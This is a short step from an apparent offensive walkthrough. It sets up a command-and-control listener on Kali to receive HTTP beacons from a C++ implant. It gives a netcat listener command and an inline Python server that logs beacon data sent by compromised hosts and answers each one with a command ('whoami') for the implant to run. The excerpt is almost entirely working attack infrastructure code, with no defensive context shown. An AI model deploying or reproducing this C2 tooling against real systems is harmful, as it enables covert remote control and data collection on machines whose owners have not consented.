  Step 5 — Set Up C2 Listener on Kali

  # The C++ payload communicates back over HTTP
  # Set up a simple listener to receive beacons

  # Option A: netcat (basic)
  nc -lvnp 4444

  # Option B: Python HTTP listener (see incoming requests)
  python3 -c "
  from http.server import HTTPServer, BaseHTTPRequestHandler
  import json, base64

  class C2Handler(BaseHTTPRequestHandler):
      def do_POST(self):
          length = int(self.headers['Content-Length'])
          data = self.rfile.read(length)
          print('[BEACON]', data.decode())
          self.send_response(200)
          self.end_headers()
          self.wfile.write(b'whoami')  # send command back

  HTTPServer(('0.0.0.0', 9090), C2Handler).serve_forever()
  "

  Run this on a separate terminal from the HTTP file server.

